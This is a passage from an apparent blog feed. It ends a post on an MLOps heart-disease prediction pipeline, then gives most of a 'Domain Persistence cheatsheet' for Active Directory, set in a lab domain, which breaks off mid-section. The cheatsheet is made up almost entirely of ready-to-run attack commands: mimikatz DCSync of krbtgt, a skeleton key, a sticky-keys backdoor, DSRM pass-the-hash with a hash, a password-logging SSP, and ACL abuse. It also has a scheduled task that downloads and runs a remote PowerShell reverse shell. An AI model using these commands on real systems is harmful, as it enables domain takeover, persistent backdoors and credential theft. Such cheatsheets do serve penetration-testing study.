&lt;td>Evidently&lt;/td>
&lt;td>8085&lt;/td>
&lt;td>127.0.0.1&lt;/td>
&lt;td>Data and target drift report generation (&lt;code>/dashboard&lt;/code> route)&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>Grafana&lt;/td>
&lt;td>3000&lt;/td>
&lt;td>127.0.0.1&lt;/td>
&lt;td>Data and target drift real-time dashboards&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;img src="./webservice.png" width="100%"/>
&lt;/li>
&lt;/ol>
&lt;h3 id="training">Training&lt;/h3>
&lt;p>Once the MLOps pipeline has been started, the prediction web service can already work thanks to a default pre-trained model available in the Docker image. In order to enable pipeline training workflow it is necessary to create a scheduled Prefect deployment via:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">$ make deployment
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>The training workflow will be then automatically executed every day. It will download the latest dataset (if the Kaggle credentials have been provided), search the best model in terms of accuracy among XGBoost, Support Vector Machine and Random Forest and finally will store it in the model registry. It is worth noting the training workflow can also be immediately executed without waiting the next schedule:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">$ make train
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Once the updated model is ready, it can be moved to production by restarting the pipeline:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">$ make restart
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>the web service will automatically connect to the registry and get the most updated model. If the model is still not available, it will continue to use the default one.&lt;/p>
&lt;h3 id="monitoring">Monitoring&lt;/h3>
&lt;p>It is possible to generate simulated traffic via:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">$ make generate-traffic
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Then, the prediction service can be monitored via:&lt;/p>
&lt;ul>
&lt;li>Grafana (in real-time): &lt;code>http://127.0.0.1:3000&lt;/code>&lt;/li>
&lt;li>Evidently (for report generation): &lt;code>http://127.0.0.1:8085/dashboard&lt;/code>&lt;/li>
&lt;/ul>
&lt;h3 id="disposal">Disposal&lt;/h3>
&lt;p>The MLOps pipeline can be disposed via:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">$ make kill
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>while the Docker volumes used for persistence can be removed via:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">$ make clean
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="github-actions">GitHub Actions&lt;/h2>
&lt;ul>
&lt;li>&lt;strong>Continuous Integration&lt;/strong>: On every push and pull request on &lt;code>main&lt;/code> and &lt;code>dev&lt;/code> branches, the Docker images are built, tested and then pushed to DockerHub.&lt;/li>
&lt;li>&lt;strong>Continuous Deployment&lt;/strong>: On every push and pull request on &lt;code>main&lt;/code> branch, only if the Continuous Integration workflow has been successful successful, the updated pipeline is deployed to the target server and run.&lt;/li>
&lt;/ul>
&lt;h2 id="applied-technologies">Applied technologies&lt;/h2>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th>Name&lt;/th>
&lt;th>Scope&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td>Jupyter Notebooks&lt;/td>
&lt;td>Exploratory data analysis and pipeline prototyping.&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>Docker&lt;/td>
&lt;td>Application containerization.&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>Docker-Compose&lt;/td>
&lt;td>Multi-container Docker applications definition and running.&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>Prefect&lt;/td>
&lt;td>Workflow orchestration.&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>MLFlow&lt;/td>
&lt;td>Experiment tracking and model registry.&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>PostgreSQL&lt;/td>
&lt;td>MLFLow experiment tracking database.&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>MinIO&lt;/td>
&lt;td>High Performance Object Storage compatible with Amazon S3 cloud storage service.&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>Flask&lt;/td>
&lt;td>Web server.&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>Bootstrap&lt;/td>
&lt;td>Frontend toolkit.&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>MongoDB&lt;/td>
&lt;td>Prediction database.&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>EvidentlyAI&lt;/td>
&lt;td>ML models evaluation and monitoring.&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>Prometheus&lt;/td>
&lt;td>Time Series Database for ML models real-time monitoring.&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>Grafana&lt;/td>
&lt;td>ML models real-time monitoring dashboards.&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>pytest&lt;/td>
&lt;td>Python unit testing suite.&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>pylint&lt;/td>
&lt;td>Python static code analysis.&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>black&lt;/td>
&lt;td>Python code formatting.&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>isort&lt;/td>
&lt;td>Python import sorting.&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>Pre-Commit Hooks&lt;/td>
&lt;td>Simple code issue identification before submission.&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>GitHub Actions&lt;/td>
&lt;td>CI/CD pipelines.&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;h2 id="disclaimer">Disclaimer&lt;/h2>
&lt;p>This prediction service has been developed as the final project of the MLOps Zoomcamp course from DataTalks.Club. It does not provide medical advice and it is intended for informational purposes only. It cannot be considered a substitute for professional medical advice, diagnosis or treatment. Never ignore professional medical advice in seeking treatment because of something you have read here.&lt;/p></description></item><item><title>Domain Persistence cheatsheet</title><link>https://www.peco602.com/post/0040-domain-persistence-cheatsheet/</link><pubDate>Thu, 01 Sep 2022 00:00:00 +0000</pubDate><guid>https://www.peco602.com/post/0040-domain-persistence-cheatsheet/</guid><description>&lt;p>The following techiniques require Domain Administrator privileges on the target domain.&lt;/p>
&lt;h2 id="dcsync">DCSync&lt;/h2>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">.\mimikatz.exe
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">mimikatz # lsadump::dcsync /domain:cyberlab.cybercorp.local /user:krbtgt
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="p">.&lt;/span> &lt;span class="p">.\&lt;/span>&lt;span class="nb">Invoke-Mimikatz&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">ps1&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-Mimikatz&lt;/span> &lt;span class="n">-Command&lt;/span> &lt;span class="err">“&lt;/span>&lt;span class="n">lsadump&lt;/span>&lt;span class="p">::&lt;/span>&lt;span class="n">dcsync&lt;/span> &lt;span class="p">/&lt;/span>&lt;span class="n">domain&lt;/span>&lt;span class="err">:&lt;/span>&lt;span class="n">cyberlab&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">cybercorp&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">local&lt;/span> &lt;span class="p">/&lt;/span>&lt;span class="n">user&lt;/span>&lt;span class="err">:&lt;/span>&lt;span class="n">krbtgt&lt;/span>&lt;span class="err">”&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="adding-domain-admin-user">Adding domain admin user&lt;/h2>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="n">net&lt;/span> &lt;span class="n">user&lt;/span> &lt;span class="n">jeff&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">ridges&lt;/span> &lt;span class="n">FooBar123&lt;/span>&lt;span class="p">!&lt;/span> &lt;span class="p">/&lt;/span>&lt;span class="n">add&lt;/span> &lt;span class="p">/&lt;/span>&lt;span class="n">domain&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">net&lt;/span> &lt;span class="nb">group &lt;/span>&lt;span class="s2">&amp;#34;Administrators&amp;#34;&lt;/span> &lt;span class="n">jeff&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">ridges&lt;/span> &lt;span class="p">/&lt;/span>&lt;span class="n">add&lt;/span> &lt;span class="p">/&lt;/span>&lt;span class="n">domain&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">net&lt;/span> &lt;span class="nb">group &lt;/span>&lt;span class="s2">&amp;#34;Domain Admins&amp;#34;&lt;/span> &lt;span class="n">jeff&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">ridges&lt;/span> &lt;span class="p">/&lt;/span>&lt;span class="n">add&lt;/span> &lt;span class="p">/&lt;/span>&lt;span class="n">domain&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">net&lt;/span> &lt;span class="nb">group &lt;/span>&lt;span class="s2">&amp;#34;Enterprise Admins&amp;#34;&lt;/span> &lt;span class="n">jeff&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">ridges&lt;/span> &lt;span class="p">/&lt;/span>&lt;span class="n">add&lt;/span> &lt;span class="p">/&lt;/span>&lt;span class="n">domain&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="enabling-plaintext-credentials-caching-on-dcs">Enabling plaintext credentials caching on DCs&lt;/h2>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="n">reg&lt;/span> &lt;span class="n">add&lt;/span> &lt;span class="s2">&amp;#34;\\cyberlab-dc.cyberlab.cybercorp.local\HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest&amp;#34;&lt;/span> &lt;span class="p">/&lt;/span>&lt;span class="n">v&lt;/span> &lt;span class="n">UseLogonCredential&lt;/span> &lt;span class="p">/&lt;/span>&lt;span class="n">t&lt;/span> &lt;span class="n">REG_DWORD&lt;/span> &lt;span class="p">/&lt;/span>&lt;span class="n">d&lt;/span> &lt;span class="mf">1&lt;/span> &lt;span class="p">/&lt;/span>&lt;span class="n">f&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">reg&lt;/span> &lt;span class="n">add&lt;/span> &lt;span class="s2">&amp;#34;\\cyberlab-dc.cyberlab.cybercorp.local\HKLM\SYSTEM\CurrentControlSet\Control\Lsa&amp;#34;&lt;/span> &lt;span class="p">/&lt;/span>&lt;span class="n">v&lt;/span> &lt;span class="n">DisableDomainCreds&lt;/span> &lt;span class="p">/&lt;/span>&lt;span class="n">t&lt;/span> &lt;span class="n">REG_DWORD&lt;/span> &lt;span class="p">/&lt;/span>&lt;span class="n">d&lt;/span> &lt;span class="mf">0&lt;/span> &lt;span class="p">/&lt;/span>&lt;span class="n">f&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="installing-a-sticky-keys-backdoor-on-dcs">Installing a sticky keys backdoor on DCs&lt;/h2>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="n">reg&lt;/span> &lt;span class="n">add&lt;/span> &lt;span class="s2">&amp;#34;\\cyberlab-dc.cyberlab.cybercorp.local\HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe&amp;#34;&lt;/span> &lt;span class="p">/&lt;/span>&lt;span class="n">v&lt;/span> &lt;span class="n">Debugger&lt;/span> &lt;span class="p">/&lt;/span>&lt;span class="n">t&lt;/span> &lt;span class="n">REG_SZ&lt;/span> &lt;span class="p">/&lt;/span>&lt;span class="n">d&lt;/span> &lt;span class="s2">&amp;#34;C:\windows\system32\cmd.exe&amp;#34;&lt;/span> &lt;span class="p">/&lt;/span>&lt;span class="n">f&lt;/span>&lt;span class="s2">&amp;#34;);
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="scheduled-task">Scheduled Task&lt;/h2>
&lt;p>Schedule and execute a task (needs a Silver Ticket for the HOST service)&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="n">schtasks&lt;/span> &lt;span class="p">/&lt;/span>&lt;span class="n">create&lt;/span> &lt;span class="p">/&lt;/span>&lt;span class="n">S&lt;/span> &lt;span class="s2">&amp;#34;cyberlab-dc.cyberlab.cybercorp.local&amp;#34;&lt;/span> &lt;span class="p">/&lt;/span>&lt;span class="nb">SC &lt;/span>&lt;span class="n">Minute&lt;/span> &lt;span class="p">/&lt;/span>&lt;span class="n">RU&lt;/span> &lt;span class="s2">&amp;#34;NT Authority\SYSTEM&amp;#34;&lt;/span> &lt;span class="p">/&lt;/span>&lt;span class="n">TN&lt;/span> &lt;span class="s2">&amp;#34;TASK_NAME&amp;#34;&lt;/span> &lt;span class="p">/&lt;/span>&lt;span class="n">TR&lt;/span> &lt;span class="s2">&amp;#34;powershell.exe -ep bypass -c &amp;#39;iex (New-Object Net.WebClient).DownloadString(&amp;#39;&amp;#39;http://192.168.100.1:8080/Invoke-PowerShellTcp.ps1&amp;#39;&amp;#39;&amp;#39;)&amp;#39;&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">schtasks&lt;/span> &lt;span class="p">/&lt;/span>&lt;span class="n">run&lt;/span> &lt;span class="p">/&lt;/span>&lt;span class="n">S&lt;/span> &lt;span class="s2">&amp;#34;cyberlab-dc.cyberlab.cybercorp.local&amp;#34;&lt;/span> &lt;span class="p">/&lt;/span>&lt;span class="n">TN&lt;/span> &lt;span class="s2">&amp;#34;TASK_NAME&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">schtasks&lt;/span> &lt;span class="p">/&lt;/span>&lt;span class="n">delete&lt;/span> &lt;span class="p">/&lt;/span>&lt;span class="n">S&lt;/span> &lt;span class="s2">&amp;#34;cyberlab-dc.cyberlab.cybercorp.local&amp;#34;&lt;/span> &lt;span class="p">/&lt;/span>&lt;span class="n">TN&lt;/span> &lt;span class="s2">&amp;#34;TASK_NAME&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="skeleton-key">Skeleton Key&lt;/h2>
&lt;p>Use the below command to inject a skeleton key (password would be &lt;em>mimikatz&lt;/em>) on a Domain Controller of choice (DA privileges required)&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Invoke-Mimikatz.ps1&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-Mimikatz&lt;/span> &lt;span class="n">-Command&lt;/span> &lt;span class="s1">&amp;#39;&amp;#34;misc::skeleton&amp;#34;&amp;#39;&lt;/span> &lt;span class="n">-ComputerName&lt;/span> &lt;span class="s2">&amp;#34;COMPUTER1&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">:: mimikatz.exe
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">mimikatz # privilege::debug
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">mimikatz # token::elevate
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">mimikatz # misc::skeleton
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Now, it is possible to access any machine with a valid username and password as &lt;em>mimikatz&lt;/em>:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Enter-PSSession&lt;/span> &lt;span class="n">-ComputerName&lt;/span> &lt;span class="s2">&amp;#34;COMPUTER1&amp;#34;&lt;/span> &lt;span class="n">-Credential&lt;/span> &lt;span class="s2">&amp;#34;cyberlab.cybercorp.local\Administrator&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>In case lsass is running as a protected process, we can still use Skeleton Key but it needs the mimikatz driver (mimidriv.sys) on disk of the target DC:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">:: mimikatz.exe
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">mimikatz # privilege::debug
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">mimikatz # !+
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">mimikatz # !processprotect /process:lsass.exe /remove
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">mimikatz # misc::skeleton
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">mimikatz # !
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="dsrm">DSRM&lt;/h2>
&lt;p>There is a local administrator on every DC called &lt;em>Administrator&lt;/em> whose password is the DSRM password. After altering the configuration on the DC, it is possible to pass the NTLM hash of this user to access the DC.&lt;/p>
&lt;p>Dump DSRM password (requires Domain Admin privileges):&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Invoke-Mimikatz&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-Mimikatz&lt;/span> &lt;span class="n">-Command&lt;/span> &lt;span class="s1">&amp;#39;&amp;#34;token::elevate&amp;#34; &amp;#34;lsadump::sam&amp;#34;&amp;#39;&lt;/span> &lt;span class="n">-ComputerName&lt;/span> &lt;span class="s2">&amp;#34;cyberlab-dc.cyberlab.cybercorp.local&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Enable logon through hash for DSRM:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="nb">New-ItemProperty&lt;/span> &lt;span class="s2">&amp;#34;HKLM:\System\CurrentControlSet\Control\Lsa\&amp;#34;&lt;/span> &lt;span class="n">-Name&lt;/span> &lt;span class="s2">&amp;#34;DsrmAdminLogonBehavior&amp;#34;&lt;/span> &lt;span class="n">-Value&lt;/span> &lt;span class="mf">2&lt;/span> &lt;span class="n">-PropertyType&lt;/span> &lt;span class="n">DWORD&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Since it is the local administrator of the DC, we can pass-the-hash to authenticate. Use below command to pass the hash (/domain: parameter needs machine and not domain name)&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Invoke-Mimikatz&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-Mimikatz&lt;/span> &lt;span class="n">-Command&lt;/span> &lt;span class="s1">&amp;#39;&amp;#34;sekurlsa::pth /domain:[DC_FQDN] /user:Administrator /ntlm:[DSRM_NTLM_HASH] /run:powershell.exe&amp;#34;&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-Mimikatz&lt;/span> &lt;span class="n">-Command&lt;/span> &lt;span class="s1">&amp;#39;&amp;#34;sekurlsa::pth /domain:cyberlab-dc.cyberlab.cybercorp.local /user:Administrator /ntlm:a102ad5753f4c441e3af31c97fad86fd /run:powershell.exe&amp;#34;&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Now, it is possible to navigate through domain controller file system:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="nb">ls &lt;/span>&lt;span class="p">\\&lt;/span>&lt;span class="nb">cyberlab-dc&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">cyberlab&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">cybercorp&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">local&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">C&lt;/span>&lt;span class="p">$&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="custom-ssp">Custom SSP&lt;/h2>
&lt;p>Add mililib.dll library to log every account access. Drop the &lt;strong>mimilib.dll&lt;/strong> to &lt;em>system32&lt;/em> and add mimilib to &lt;em>HKLMPackages&lt;/em>:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="n">packages&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="nb">Get-ItemProperty&lt;/span> &lt;span class="n">HKLM&lt;/span>&lt;span class="err">:&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">SYSTEM&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">CurrentControlSet&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">Control&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">Lsa&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">OSConfig&lt;/span>&lt;span class="p">\&lt;/span> &lt;span class="n">-Name&lt;/span> &lt;span class="s1">&amp;#39;Security Packages&amp;#39;&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">select &lt;/span>&lt;span class="n">-ExpandProperty&lt;/span> &lt;span class="s1">&amp;#39;Security Packages&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$packages&lt;/span> &lt;span class="p">+=&lt;/span> &lt;span class="s2">&amp;#34;mimilib&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Set-ItemProperty&lt;/span> &lt;span class="n">HKLM&lt;/span>&lt;span class="err">:&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">SYSTEM&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">CurrentControlSet&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">Control&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">Lsa&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">OSConfig&lt;/span>&lt;span class="p">\&lt;/span> &lt;span class="n">-Name&lt;/span> &lt;span class="s1">&amp;#39;Security Packages&amp;#39;&lt;/span> &lt;span class="n">-Value&lt;/span> &lt;span class="nv">$packages&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Set-ItemProperty&lt;/span> &lt;span class="n">HKLM&lt;/span>&lt;span class="err">:&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">SYSTEM&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">CurrentControlSet&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">Control&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">Lsa&lt;/span>&lt;span class="p">\&lt;/span> &lt;span class="n">-Name&lt;/span> &lt;span class="s1">&amp;#39;Security Packages&amp;#39;&lt;/span> &lt;span class="n">-Value&lt;/span> &lt;span class="nv">$packages&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Using mimikatz, inject into lsass (Not stable with Server 2016):&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-Mimikatz&lt;/span> &lt;span class="n">-Command&lt;/span> &lt;span class="s1">&amp;#39;&amp;#34;misc::memssp&amp;#34;&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Once the SSP is registered, all users who log on to the DC, and all local services will log their passwords to the &lt;strong>c:\Windows\System32\mimilsa.log&lt;/strong> file.&lt;/p>
&lt;h2 id="acl-right-abuse">ACL Right Abuse&lt;/h2>
&lt;p>With DA privileges, the ACL for the domain root can be modified to provide useful rights like FullControl or the ability to run “DCSync”.&lt;/p>
&lt;ol>
&lt;li>
&lt;p>Check if the user has replication rights on the domain:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerView&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-ObjectAcl&lt;/span> &lt;span class="n">-DistinguishedName&lt;/span> &lt;span class="s2">&amp;#34;dc=cyberlab,dc=cybercorp,dc=local&amp;#34;&lt;/span> &lt;span class="n">-ResolveGUIDs&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="p">?{(&lt;/span>&lt;span class="nv">$_&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">IdentityReference&lt;/span> &lt;span class="o">-match&lt;/span> &lt;span class="s2">&amp;#34;STUDENT1&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">-and&lt;/span> &lt;span class="p">((&lt;/span>&lt;span class="nv">$_&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">ObjectType&lt;/span> &lt;span class="o">-match&lt;/span> &lt;span class="s1">&amp;#39;replication&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">-or&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nv">$_&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">ActiveDirectoryRights&lt;/span> &lt;span class="o">-match&lt;/span> &lt;span class="s1">&amp;#39;GenericAll&amp;#39;&lt;/span>&lt;span class="p">))}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>
&lt;p>Add FullControl rights to the domain object:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerView&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Add-ObjectAcl&lt;/span> &lt;span class="n">-TargetDistinguishedName&lt;/span> &lt;span class="s2">&amp;#34;DC=cyberlab,DC=cybercorp,DC=local&amp;#34;&lt;/span> &lt;span class="n">-PrincipalSamAccountName&lt;/span> &lt;span class="s2">&amp;#34;STUDENT1&amp;#34;&lt;/span> &lt;span class="n">-Rights&lt;/span> &lt;span class="n">All&lt;/span> &lt;span class="n">-Verbose&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># ActiveDirectory Module&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Set-ADACL&lt;/span> &lt;span class="n">-DistinguishedName&lt;/span> &lt;span class="s2">&amp;#34;DC=cyberlab,DC=cybercorp,DC=local&amp;#34;&lt;/span> &lt;span class="n">-Principal&lt;/span> &lt;span class="s2">&amp;#34;STUDENT1&amp;#34;&lt;/span> &lt;span class="n">-Verbose&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>or just add rights for DCSync and perform it:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerView&lt;/span>
